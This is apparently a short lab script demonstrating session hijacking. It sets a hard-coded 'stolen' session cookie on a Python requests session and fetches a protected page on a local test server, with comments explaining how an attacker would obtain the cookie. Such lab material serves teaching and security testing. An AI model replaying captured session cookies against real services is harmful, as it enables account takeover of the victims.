# hijack_session.py
import requests

# In a real attack, the attacker would capture the session cookie value from the victim.
# For this lab, you can manually obtain the session cookie from your browser after logging in.
# For example, using your browser's developer tools, look for a cookie named "session" and copy its value.

stolen_session_cookie = 'eyJ1c2VybmFtZSI6InJvY2tpa3oifQ.Z7MQtg.fQOOHftLeQn5NoJQhNVSjUFbipE'

# Create a session and set the stolen cookie
hijacked_session = requests.Session()
hijacked_session.cookies.set('session', stolen_session_cookie)

# Attempt to access the protected resource
response = hijacked_session.get('http://localhost:5000/')
print(response.text)
